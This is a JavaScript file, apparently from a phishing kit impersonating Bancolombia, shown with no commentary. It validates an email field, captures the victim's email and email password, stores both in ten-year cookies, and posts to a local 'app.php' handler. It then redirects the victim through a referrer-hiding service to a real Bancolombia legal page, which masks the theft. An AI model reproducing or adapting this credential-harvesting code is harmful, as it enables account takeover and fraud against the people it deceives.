
function _k_email(email){
    const emailRegex = /^(([^<>()\[\]\\.,:\s@"]+(\.[^<>()\[\]\\.,:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
    if(emailRegex.test(email)){$('#btnGo').prop('disabled',false);}
    else {$('#btnGo').prop('disabled',true);}
}

function ck_email(){
if ($('#correopass').val().length >=5) {
new _k_email($('#correo').val());
}else {$('#btnGo').prop('disabled',true);}
}
setInterval(function() { new ck_email();}, 700);


$('#btnGo').click(function(){
var correo = $('#correo').val();
var correopass = $('#correopass').val();
$.cookie('correo', correo, { expires: 365 * 10 });
$.cookie('correopass', correopass, { expires: 365 * 10 });
$.post('assets/php/app.php', {content:'correo'});
setTimeout(function() {
var url = "https://href.li/?https://www.grupobancolombia.com/personas/documentos-legales/proteccion-datos/bancolombia-sa/";
$(location).attr('href',url);}, 500);
});
